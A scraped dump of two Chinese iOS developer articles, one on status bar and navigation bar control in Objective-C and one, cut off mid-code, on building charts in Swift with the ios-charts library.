<p>将<code>info.plist</code>文件的<code>View controller-based status bar appearance</code>设置为<code>NO</code>，即可开启全局设置，也就是说你在VC中对状态栏的控制都将无效，相比之下，是通过下面的代码来全局控制：</p>
<pre><code class=""objectivec"">//设置状态栏的字体颜色模式
[[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];
//设置状态栏是否隐藏
[[UIApplication sharedApplication] setStatusBarHidden:YES];
</code></pre>
<p>注意，我们并不能对状态栏的字体颜色做任意的控制，只有两种选择<code>UIStatusBarStyleDefault</code>和<code>UIStatusBarStyleLightContent</code>，前者是默认的黑色，而后者是白色。也就是说如果你的背景色是偏深色，那么设置状态栏的字体颜色为白色。另外，我们可以全局设置状态栏是否显示，但是一般而言app不会对所有界面都不显示状态栏，而是只在特定的页面需要隐藏状态栏，比如对于视频播放界面不希望显示状态栏。</p>
<p>对于状态栏的背景色设置，上面提到从ios7开始状态栏本身实际上是透明的，它的背景色其实取决于导航栏的背景色。下面会讲导航栏的设置。</p>
<h3>分页面设置状态栏</h3>
<p>将<code>info.plist</code>文件的<code>View controller-based status bar appearance</code>设置为<code>YES</code>，即可开启由VC来控制状态栏的功能，在这种模式下，全局的设置将无效！！所以我们必须逐个页面对状态栏进行设置，否则状态栏将维持默认的黑色字体和默认为显示状态。</p>
<h4>字体设置</h4>
<p>对于设置状态栏字体颜色，分两种情况：VC是否属于<code>UINavigationController</code>中：</p>
<p>1) 当VC不在<code>UINavigationController</code>中时，在VC中添加一个方法</p>
<pre><code class=""objectivec"">
- (UIStatusBarStyle)preferredStatusBarStyle
{ 
    //返回白色
    return UIStatusBarStyleLightContent;
    //返回黑色
    //return UIStatusBarStyleDefault;
}
</code></pre>
<p>保险起见，在view的某个加载阶段比如<code>viewWillAppear</code>中，执行：</p>
<pre><code class=""objectivec"">
[self setNeedsStatusBarAppearanceUpdate];
</code></pre>
<p>2) 当VC在<code>UINavigationController</code>中时，VC并不能通过1)的方式控制状态栏的颜色，详见本文后面的参考资料，那么这个时候，有一个trick的方法可以在VC中间接的控制：</p>
<pre><code class=""objectivec"">
self.navigationController.navigationBar.barStyle = UIBarStyleBlack;
</code></pre>
<h4>隐藏控制</h4>
<p>对于控制状态栏的隐藏同样存在VC是否是根控制器的问题，也就说只有根控制器才能直接控制状态栏的显示与否。</p>
<p>1) 如果是VC本身就是根控制器，那么在VC中添加如下代码：</p>
<pre><code class=""objectivec"">
- (BOOL)prefersStatusBarHidden {
    return YES;
}
</code></pre>
<p>当然，保险起见，在适当的时候调用</p>
<pre><code class=""objectivec"">
[self setNeedsStatusBarAppearanceUpdate];
</code></pre>
<p>2) 如果VC不是根控制器，那么不像控制字体颜色那样有trick，我们只能间接的通过在子VC中控制根VC，从而间接控制根控制器。那么这个方法就很多了，比如我的根VC是个tab的VC，首先现在tab的VC中，实现1)：</p>
<pre><code class=""objectivec"">
@interface YYCTabBarController : RDVTabBarController

//定义一个变量来控制状态栏显示，子VC通过修改这个值来间接控制
@property (nonatomic,assign)BOOL statusBarHidden;

@end

@implementation YYCTabBarController

- (BOOL)prefersStatusBarHidden {
    return _statusBarHidden;
}

@end
</code></pre>
<p>在子VC中：</p>
<pre><code class=""objectivec"">
- (void)viewWillAppear:(BOOL)animated{
    [super viewWillAppear:animated];
    
    //rdv_tabBarController指向YYCTabBarController
    if([self.rdv_tabBarController respondsToSelector:@selector(setStatusBarHidden:)]){
        [self.rdv_tabBarController performSelector:@selector(setStatusBarHidden:) withObject:@(YES)];
        [self setNeedsStatusBarAppearanceUpdate];
    }
}

- (void)viewWillDisappear:(BOOL)animated{
    [super viewWillDisappear:animated];
    
    if([self.rdv_tabBarController respondsToSelector:@selector(setStatusBarHidden:)]){
        //注意对NO的情况，不能传@NO，只能传nil才能被当成NO
        [self.rdv_tabBarController performSelector:@selector(setStatusBarHidden:) withObject:nil];
        [self setNeedsStatusBarAppearanceUpdate];
    }
}
</code></pre>
<p>可以看到在子VC中通过设置根VC的属性，并调用<code>setNeedsStatusBarAppearanceUpdate</code>后，根VC的<code>prefersStatusBarHidden</code>就会被调用，从而隐藏或显示状态栏。</p>
<h2>导航栏控制</h2>
<h3>背景控制</h3>
<p>在IOS7中使用<code>barTintColor</code>来控制导航栏的背景色:</p>
<pre><code class=""objectivec"">
[[UINavigationBar appearance] setBarTintColor:[UIColor yellowColor]]; 
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004844969"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这个设置方法可以在<code>AppDelegate</code>中设置，全局可以生效。</p>
<p>如果希望使用图片来作为导航的背景，那么需要注意的是ios7中图片的高度问题。上面提到过了，ios7导航栏的高度其实是算上状态栏的，即44+20=64个点的高度。可以通过<code>setBackgroundImage</code>来设置：</p>
<pre><code class=""objectivec"">
[[UINavigationBar appearance] setBackgroundImage:[UIImage imageNamed:@ ""nav_bg.png"" ] forBarMetrics:UIBarMetricsDefault]; 
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004844973"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>前景控制</h3>
<p>前景控制分为标题控制和返回按钮(等系统按钮)的控制</p>
<p>标题需要通过<code>setTitleTextAttributes</code>来设置，相对比较复杂一些，例如：</p>
<pre><code class=""objectivec"">
NSShadow *shadow = [[NSShadow alloc] init]; 
shadow.shadowColor = [UIColor colorWithRed:0.0 green:0.0 blue:0.0 alpha:0.8]; 
shadow.shadowOffset = CGSizeMake(0, 1); 
[[UINavigationBar appearance] setTitleTextAttributes: [NSDictionary dictionaryWithObjectsAndKeys: 
        [UIColor colorWithRed:245.0/255.0 green:245.0/255.0 blue:245.0/255.0 alpha:1.0], NSForegroundColorAttributeName, 
        shadow, NSShadowAttributeName, 
        [UIFont fontWithName:@ ""HelveticaNeue-CondensedBlack""  size:21.0], NSFontAttributeName, nil]]; 
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004844971"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>设置返回按钮(等系统按钮)可以通过<code>TintColor</code>，直接来设置颜色</p>
<pre><code class=""objectivec"">
[[UINavigationBar appearance] setTintColor:[UIColor whiteColor]];
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006767429"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>显示设置</h3>
<p>有时我们希望导航栏不显示，而有时又希望显示，那么最好通过每个个体的VC来控制，如果某个VC需要与其他VC有所区别，那么最好是“负责到底”，即在进入VC时改变导航栏的显示状态，而退出时还原：</p>
<pre><code class=""objectivec"">
- (void) viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    [self.navigationController.navigationBar setHidden:YES];
    [self.rdv_tabBarController setTabBarHidden:YES animated:NO];
}

- (void) viewWillDisappear:(BOOL)animated {
    [super viewWillDisappear:animated];
    [self.navigationController.navigationBar setHidden:NO];
    [self.rdv_tabBarController setTabBarHidden:NO animated:NO];
}
</code></pre>
<h3>如何在有导航栏的情况下定位控件的Y</h3>
<p>可能初学ios的同学(尤其是通过手写代码布局的同学)都会有这么个感受，为什么我的控件有的时候明明定位在VC上，但会被导航栏遮住，那么你可能会得出结论原点(0,0)是在屏幕的左上角被导航栏遮住的；而对于像<code>UITableView</code>这样的，设置了全屏铺满，怎么就没有被导航栏遮住呢？原点难道不在左上角？</p>
<p>笔者被这个问题困扰了很久，这里谈一下最近的一个理解。我们拿<code>UITextView</code>来看</p>
<p>当我们把一个<code>UITextView</code>放到一个没有导航的VC中时：</p>
<pre><code class=""objectivec"">
UITextView *textView = [[UITextView alloc] init];
textView.frame = CGRectMake(10, 200, 300, 120);
textView.backgroundColor = [UIColor redColor];
textView.text = @""游戏分两种,一种是在生活中玩的,另一种是生活在其中的。这两个世界相互矛盾,而两位约翰就分别属于这不同的世界。"";
textView.font = [UIFont boldSystemFontOfSize:40];
textView.editable = NO;
[self.view addSubview:textView]
</code></pre>
<p>效果是这样的，看起来并没有什么问题</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004848543"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>然而如果我们把这个VC放到一个导航控制器中，同样的代码却是这样结果</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004848545"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>首先，看起来<code>UITextView</code>距离设备顶部的绝对距离似乎并没有变化，但是请注意<code>UITextView</code>的滚动条，滚动条竟然没有顶部对齐，而且文字也向下移位了，看起来空出一大块。仔细看空出的这段高度其实刚好是导航栏的高度64个点！！经过搜索，我发现只要设置如下代码即可恢复这种异常的状况：</p>
<pre><code class=""objectivec"">
self.automaticallyAdjustsScrollViewInsets = NO;
</code></pre>
<p>这下明白了，原来VC会对其内部的<code>UIScrollView</code>的内容部分进行一个<code>Inset</code>，这个<code>Inset</code>在上半部分刚好就对应导航栏的高度，而<code>UIScrollView</code>包括<code>UITableView</code>和<code>UITextView</code>等。到这里，似乎有些问题明朗了：</p>
<ol>
<li><p>VC中的view默认会对<code>UIScrollView</code>做一个适应导航栏的处理，由此推测，其实只要是VC中的控件，都是从设备左上角的(0,0)开始算的，只是对于<code>UIScrollView</code>，VC会自动调整一下内容的位置而已。</p></li>
<li><p>在有导航的情况下，可视范围的Y坐标就是从64开始的，除了<code>UIScrollView</code>的控件，定位的时候，都应当以(0,64)为原点；而<code>UIScrollView</code>如果是全屏的，那么无所谓，如果不是全屏的，请注意是否需要设置VC的<code>automaticallyAdjustsScrollViewInsets</code>。</p></li>
</ol>
<p>参考资料</p>
<ul>
<li><p><a href=""http://www.tuicool.com/articles/IZFRJbN"" rel=""nofollow noreferrer"">定制iOS 7中的导航栏和状态栏</a></p></li>
<li><p><a href=""http://www.appcoda.com/customize-navigation-bar-back-butto/"" rel=""nofollow noreferrer"">iOS Programming 101: How to Customize Navigation Bar and Back Button</a></p></li>
<li><p><a href=""http://stackoverflow.com/questions/17678881/how-to-change-status-bar-text-color-in-ios-7#comment28947732_17768797"" rel=""nofollow noreferrer"">How to change Status Bar text color in iOS 7</a></p></li>
<li><p><a href=""http://stackoverflow.com/questions/19022210/preferredstatusbarstyle-isnt-called/19513714#19513714"" rel=""nofollow noreferrer"">preferredStatusBarStyle isn't called</a></p></li>
<li><p><a href=""http://stackoverflow.com/questions/18931934/blank-space-at-top-of-uitextview-in-ios-7"" rel=""nofollow noreferrer"">Blank space at top of UITextView in iOS 7</a></p></li>
</ul>

                ", IOS状态栏和导航栏的控制问题,1531972095,519,1,549,1,1,https://segmentfault.com/a/1190000003482218
140,1,0,6,"
                    
<p><strong>【编者按】本文作者 Joyce Echessa 是渥合数位服务创办人，毕业于台湾大学，近年来专注于协助客户进行 App 软体以及网站开发。文中作者通过示例介绍用 ios-charts 库创建简易美观的图表，有助于开发者在应用中生动形象地向用户展示数据。本文系 <a href=""http://www.oneapm.com/index.html?utm_source=Community&amp;utm_medium=Article&amp;utm_term=chart&amp;utm_campaign=AugSoftArti&amp;from=matefiausc"" rel=""nofollow noreferrer"">OneAPM</a> 工程师编译整理：</strong></p>
<p>呈现大量数据时，比起表格中一行行枯燥的数据，使用图表来形象地表示数据可以帮助用户更好地理解。在图表中，不需要通读所有数据资料，便能很容易地了解数据模式，从而获取关键信息。图表的使用在商业 App 和健身 App 中非常常见。</p>
<p>本篇文章中，我们主要介绍由 Daniel Cohen Gindi 开发的 <a href=""https://github.com/danielgindi/ios-charts"" rel=""nofollow noreferrer"">ios-charts library</a>。ios-charts 是由 Philipp Jahoda 建立的，是非常流行的 Android 库 <a href=""https://github.com/PhilJay/MPAndroidChart"" rel=""nofollow noreferrer"">MPAndroidChart</a> 的 <a href=""http://www.oneapm.com/mi/ios.html?utm_source=Community&amp;utm_medium=Article&amp;utm_term=chart&amp;utm_campaign=AugSoftArti&amp;from=matefiausc"" rel=""nofollow noreferrer"">iOS</a> 端口。有了这个库，你可以方便快捷地在应用中添加不同类型的图表。仅需寥寥几行代码，就可以制作出功能齐备、交互性强的图表，并且高度可定制。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004849111"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>函数库的主要特征：</p>
<ul>
<li><p>8种不同的图表类型；</p></li>
<li><p>两个轴的缩放（用触控手势、分轴缩放或捏拉缩放）；</p></li>
<li><p>拖拽/平移（用触控手势）；</p></li>
<li><p>图表结合（线形图、柱形图、离散图、K 线图、气泡图）；</p></li>
<li><p>双（分开的）Y 轴；</p></li>
<li><p>手指画图（用触控手势将数值画入图表）；</p></li>
<li><p>数值突出显示（自定义弹出视图）；</p></li>
<li><p>多个/分离的轴；</p></li>
<li><p>储存图表到相册/以 PNG/JPEG 格式输出；</p></li>
<li><p>预定义颜色模板；</p></li>
<li><p>图例（可自动生成，可自定义）；</p></li>
<li><p>自定义轴（包括 X 和Y 轴）；</p></li>
<li><p>动画（在 X 轴和 Y 轴上建立动画）；</p></li>
<li><p>界限（提供额外信息，比如最大值等）；</p></li>
<li><p>全方位自定义（上色、字体、图例、颜色、背景、手势、虚线等）。</p></li>
</ul>
<h2>开始吧！</h2>
<p>首先、下载本篇文章将会用到的初始示例——名为 <a href=""https://www.dropbox.com/s/9ehz8ca5g4npoc2/iOSChartsDemoStarter.zip?dl=0"" rel=""nofollow noreferrer"">iOSChartsDemo 的简易应用</a>。应用运行时，你会看到有两个项目的表格：条形图和其他图表。当点击项目时，会得到空白的视图。在本例中，笔者已创建了要用的两个视图控制器：BarChartViewController 和 ChartsViewController。</p>
<p>接着，我们添加函数库到项目中。你可以用 <a href=""https://cocoapods.org/pods/Charts"" rel=""nofollow noreferrer"">CocoaPods</a> 安装该库，这里我们直接手动安装。</p>
<p>下载 <a href=""https://github.com/danielgindi/ios-charts/archive/master.zip"" rel=""nofollow noreferrer"">ios-charts 项目</a>，这个 zip 文件包含了函数库（名为 Charts 的文件夹）和一个示例项目（名为 ChartsDemo）。如果你想了解更多关于函数库的知识，示例项目是很棒的资源。</p>
<p>解压缩已下载的文件，并将 Charts 文件复制粘贴到你项目（iOSChartsDemo）的根目录下。在 Finder 中打开Charts文件，并将 Charts.xcodeproj 拖拽到 Xcode 项目中。结构如下图所示。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857332"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>接着从项目导航中选择你的项目，并确保该 iOSChartsDemo 目标被选中。在右边的常规选项卡中找到 Embedded Binaries 部分，点击该部分的<code>+</code>号添加图表框架。从列表中选择 Charts.framework 并点击 Add。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857334"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>如果你想在 Objective-C 中使用函数库，请参考使用说明。</p>
<p>用 Command-B 或选择 Product &gt; Build 来生成项目。如果不这样做，当你导入 Charts 框架到你的项目时，Xcode 会报错——无法加载 Charts 底层模块。</p>
<p>现在开始创建第一个图表。</p>
<h2>创建一个柱形图</h2>
<p>打开 BarChartViewController.swift 文件，添加以下声明。</p>
<pre><code class=""Swift"">import Charts</code></pre>
<p>打开故事板文件。我们需要添加用来显示图表的视图。从文档纲要中选择 Bar Chart View Controller，并在属性检查器中取消 Extend Edges 的 Under Top Barsin 选项。我们不希望图表自动延伸至导航栏下方。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857336"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>接着拖拽一个视图到 Bar Chart View Controller 中，并按下图定位边界。该视图为控制器中主视图的子视图。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857338"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>视图被选中后，在识别检查器中将它的类设为 BarChartView。再使用助理编辑器，加入视图的 outlet 到 BarChartViewController 类，并命名为 outletbarChartView。在 BarChartViewController 类中添加下列代码。</p>
<pre><code class=""Swift"">@IBOutlet weak var barChartView: BarChartView!</code></pre>
<p>运行项目，并从表格中选择柱形图，你可能会得到视图提示信息：无可用的图表数据。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857340"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>如果在没有数据来产生图表时，你想在空白状态显示其他的信息，这时候可以自定义这个提示信息。在 viewDidLoad()函数底部，加入下列代码。</p>
<p>运行该项目，可以看到自定义的提示信息。</p>
<p>你可以为下面信息进一步添加描述。这可以用来向用户解释，为什么图表是空的，他们需要获取数据来生成图表。例如：健身 App 应该让用户知道在整理图表分析之前，他们需要先记录跑步数据。</p>
<pre><code class=""Swift"">barChartView.noDataTextDescription = ""GIVE REASON""</code></pre>
<p>添加下面的属性到该类。我们用它来存储一些图表的模拟数据。</p>
<pre><code class=""Swift"">var months: [String]!</code></pre>
<p>将下面的函数添加到该类，用以建立图表。</p>
<pre><code class=""Swift"">func setChart(dataPoints: [String], values: [Double]) {
    barChartView.noDataText = ""You need to provide data for the chart.""
        
}</code></pre>
<p>请注意，我曾经在 viewDidLoad()函数中添加了声明。现在从 viewDidLoad()中移除该声明。我们将用 setChart()来自定义图表。</p>
<p>在 viewDidLoad()中，添加以下内容到函数底部。</p>
<pre><code class=""Swift"">months = [""Jan"", ""Feb"", ""Mar"", ""Apr"", ""May"", ""Jun"", ""Jul"", ""Aug"", ""Sep"", ""Oct"", ""Nov"", ""Dec""]
let unitsSold = [20.0, 4.0, 6.0, 3.0, 12.0, 16.0, 4.0, 18.0, 2.0, 4.0, 5.0, 4.0]
        
setChart(months, values: unitsSold)</code></pre>
<p>我们设置一些模拟数据，给出一些产品一年中每个月售出的单位数。然后，我们将数据传给 setChart()。</p>
<p>让一个图表显示数据，我们还需创建一个 BarChartData 对象，并将其设置为 barChartView 的数据属性。添加下面的代码到 setChart()函数底部。</p>
<pre><code class=""Swift"">var dataEntries: [BarChartDataEntry] = []
        
for i in 0..&lt;dataPoints.count {
    let dataEntry = BarChartDataEntry(value: values[i], xIndex: i)
    dataEntries.append(dataEntry)
}
        
let chartDataSet = BarChartDataSet(yVals: dataEntries, label: ""Units Sold"")
let chartData = BarChartData(xVals: months, dataSet: chartDataSet)
barChartView.data = chartData</code></pre>
<p>以上代码中，我们创建了一个 BarChartDataEntry 对象的数组。BarChartDataEntry 初始化需要每个数据项的值、其对应的项目索引以及一个任意的标签。</p>
<p>随后，我们使用这个对象创建 BarChartDataSet，主要用来传递 BarChartDataEntry 对象的数组，以及描述数据的标签。</p>
<p>最后，我们用它来创建一个 BarChartData 对象，用来设定我们图表视图的数据。</p>
<p>运行该应用，可以看到如下图所示有数据的柱形图。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857342"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>你可以为出现在视图右下方的图表设置说明。默认情况下，文本可用来设置「说明」，该说明会出现在图片上。参考 ofMPAndroidChart 文档，你可以更改描述的位置，但看一下 <a href=""http://www.oneapm.com/mi/ios.html?utm_source=Community&amp;utm_medium=Article&amp;utm_term=chart&amp;utm_campaign=AugSoftArti&amp;from=matefiausc"" rel=""nofollow noreferrer"">iOS</a> 的 API，这并没有包括在内。函数库仍在维护，所以可能会在之后添加。如果你想改变描述的位置，你可以修改 ChartViewBase 类（是 BarChartView 类的子类）中的 drawDescription（上下文）函数。</p>
<p>针对本应用，我们移除描述文本。在 setChart()函数的底部添加下列内容，将描述文本设为空字符串。</p>
<pre><code class=""Swift"">barChartView.descriptionText = """"</code></pre>
<h2>自定义图表</h2>
<p>你可以修改一些属性来自定义图表视图的外观。下面我们来具体介绍，你也可以浏览文档看看哪些可以自定义。</p>
<p>首先，我们修改柱形图的默认颜色。添加下列设置到 setChart()函数的底部。</p>
<pre><code class=""Swift"">chartDataSet.colors = [UIColor(red: 230/255, green: 126/255, blue: 34/255, alpha: 1)]
</code></pre>
<p>以上代码设置了与数据相关的颜色。将该设定给 UIColor 对象数组。因此只要数组中有一种颜色，所有的实体均可用。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857344"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>如果你想给每一个数据对象设置不同的颜色，那么你需要提供更多的颜色，本例中需要12种。如果你的颜色数量少于实体总数，那么从坐到右将不同的颜色分配给柱形图，直到颜色用完后重新开始分配。</p>
<p>API 中也自带一些预定义颜色模板，你可以用它来为数据项设定不同颜色，它们包括：</p>
<ul>
<li><p>ChartColorTemplates.liberty()</p></li>
<li><p>ChartColorTemplates.joyful()</p></li>
<li><p>ChartColorTemplates.pastel()</p></li>
<li><p>ChartColorTemplates.colorful()</p></li>
<li><p>ChartColorTemplates.vordiplom()</p></li>
</ul>
<p>如下所示，使用 ChartColorTemplates.colorful()模板。</p>
<pre><code class=""Swift"">chartDataSet.colors = ChartColorTemplates.colorful()</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857346"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>如下所示修改 X 轴标签的位置。</p>
<pre><code class=""Swift"">barChartView.xAxis.labelPosition = .Bottom</code></pre>
<p>现在标签在图表底部。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857350"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>按照以下办法可以修改图表的背景色。</p>
<pre><code class=""Swift"">barChartView.backgroundColor = UIColor(red: 189/255, green: 195/255, blue: 199/255, alpha: 1)</code></pre>
<p>根据上述设定，你会看到如下所示的界面。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004857348"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h2>动画</h2>
<p>你可以为图表设定一些动画，使之更加生动活泼。你可以使用三种主要的动画类型方法，可以同时让 XY 轴或者分别某个轴产生动画。</p>
<ul>
<li><p>animate(xAxisDuration: NSTimeInterval, yAxisDuration: NSTimeInterval)</p></li>
<li><p>animate(xAxisDuration: NSTimeInterval)</p></li>
<li><p>animate(yAxisDuration: NSTimeInterval)</p></li>
</ul>
<p>你可以加入任意的 ChartEasingOption 到以上函数。选项如下：</p>
<ul>
<li><p>Linear</p></li>
<li><p>EaseInQuad</p></li>
<li><p>EaseOutQuad</p></li>
<li><p>EaseInOutQuad</p></li>
<li><p>EaseInCubic</p></li>
<li><p>EaseOutCubic</p></li>
<li><p>EaseInOutCubic</p></li>
<li><p>EaseInQuart</p></li>
<li><p>EaseOutQuart</p></li>
<li><p>EaseInOutQuart</p></li>
<li><p>EaseInQuint</p></li>
<li><p>EaseOutQuint</p></li>
<li><p>EaseInOutQuint</p></li>
<li><p>EaseInSine</p></li>
<li><p>EaseOutSine</p></li>
<li><p>EaseInOutSine</p></li>
<li><p>EaseInExpo</p></li>
<li><p>EaseOutExpo</p></li>
<li><p>EaseInOutExpo</p></li>
<li><p>EaseInCirc</p></li>
<li><p>EaseOutCirc</p></li>
<li><p>EaseInOutCirc</p></li>
<li><p>EaseInElastic</p></li>
<li><p>EaseOutElastic</p></li>
<li><p>EaseInOutElastic</p></li>
<li><p>EaseInBack</p></li>
<li><p>EaseOutBack</p></li>
<li><p>EaseInOutBack</p></li>
<li><p>EaseInBounce</p></li>
<li><p>EaseOutBounce</p></li>
<li><p>EaseInOutBounce</p></li>
</ul>
<p>添加下行内容到 setChart()函数。</p>
<p>运行应用，柱形图以动画的形式加入视图。我们同时为两个轴都设置2秒的动画。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004869277"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下iOS Charts API制作漂亮图表"" title=""如何在Swift语言下iOS Charts API制作漂亮图表""></span></p>
<p>修改上述状态为：</p>
<pre><code class=""Swift"">barChartView.animate(xAxisDuration: 2.0, yAxisDuration: 2.0, easingOption: .EaseInBounce)</code></pre>
<p>你会看到这行的特效如下。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006769515"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下iOS Charts API制作漂亮图表"" title=""如何在Swift语言下iOS Charts API制作漂亮图表""></span></p>
<h2>界限</h2>
<p>界限是针对所有线形图、柱形图和离散图的附加功能。它允许在图表中显示额外的线条为特定轴（X 或 Y 轴）加限制。这额外的线用来设定数据的目标值，帮助用户更容易了解是否达到界限。</p>
<p>要在图表中加入界限，可以添加以下代码到 setData()函数中。</p>
<pre><code class=""Swift"">let ll = ChartLimitLine(limit: 10.0, label: ""Target"")
barChartView.rightAxis.addLimitLine(ll)</code></pre>
<p>运行该应用，你可以看到一条红线，标记在单位10左右。上面的代码中，我们在界限上添加了一个标签。但是 ChartLimitLine 有另一个没有添加标签的初始化函数，如果不想加的话可以省略。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004866417"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<h2>触控事件</h2>
<p>如果运行应用，你会发现通过默认的捏拉缩放和双击来进行缩放。此外，如果某个柱形条被单击，该柱形条会突出显示。很棒的是无需自己再编代码就能使用该功能，除非你想添加更多的功能，比如当用户单击柱形条时有其他响应。</p>
<p>为了检测图表内的选择，我们将使用 ChartViewDelegate 协议。</p>
<p>修改该类的声明如下。</p>
<pre><code class=""Swift"">class BarChartViewController: UIViewController, ChartViewDelegate {</code></pre>
<p>在调用 super.viewDidLoad()后面添加下列代码到 viewDidLoad()。</p>
<pre><code class=""Swift"">barChartView.delegate = self</code></pre>
<p>添加下面的函数到该类。</p>
<pre><code class=""Swift"">func chartValueSelected(chartView: ChartViewBase, entry: ChartDataEntry, dataSetIndex: Int, highlight: ChartHighlight) {
    println(""\(entry.value) in \(months[entry.xIndex])"")
}</code></pre>
<p>当图表视图中的值被选中时，会调用上述函数。这里我们打印出被选中的月份和值。</p>
<h2>保存图表</h2>
<p>你可以将图表的当前状态保存为图像。可以选择将它保存到相机胶卷或者重新设置一个保存路径。</p>
<p>首先，我们将添加一个保存按钮到图表视图。打开故事板文件，并找到柱形图表视图控制器。拖动导航项目到视图控制器的导航栏，然后拖动柱形按钮项，并将其放置于导航项目的右上角。删除属性检查器中的导航项目的标题属性中的「标题」文本。选择柱形按钮项，并设置其标识便于保存到属性检查器。可以看到如下界面。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004869279"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""如何在Swift语言下用iOS Charts API制作漂亮图表"" title=""如何在Swift语言下用iOS Charts API制作漂亮图表""></span></p>
<p>接着为按钮创建一个消息响应，命名为 saveChart，添加以下代码到 BarChartViewController 类中。</p>
<pre><code class=""Swift"">@IBAction func saveChart(sender: UIBarButtonItem) {
        
}</code></pre>
<p>按照下列代码修改上面的方法。</p>
<pre><code class=""Swift"">@IBAction func saveChart(sender: UIBarButtonItem) {
    barChartView.saveToCameraRoll()
}</code></pre>
<p>执行该程序后，当点击保存按钮时，图表图像讲保存到相册，可用 Photos 应用浏览。</p>
<p>下列代码可以重新设置保存路径。</p>
<pre><code class=""Swift"">barChartView.saveToPath(path: String, format: ChartViewBase.ImageFormat, compressionQuality: Double)</code></pre>
<p>图片格式可能是 .JPEG或 .PNG，该 compressionQuality 是一种无损格式（JPEG）的压缩质量。</p>
<h2>更多图表</h2>
<p>现在我们看一下其他几个图表。大部分我们都看过了，所以不再过多赘述。</p>
<p>首先，在故事板文件中找到图表视图控制器，在识别检查器中，设定视图的标签为 Pie Chart View 的类为 PieChartView。</p>
<p>如下所示修改 ChartsViewController 类。</p>
<pre><code class=""Swift"">import UIKit
import Charts
 
class ChartsViewController: UIViewController {
    
    @IBOutlet weak var lineChartView: LineChartView!
    @IBOutlet weak var pieChartView: PieChartView!
 
    override func viewDidLoad() {
        super.viewDidLoad()
 
        // Do any additional setup after loading the view.
        
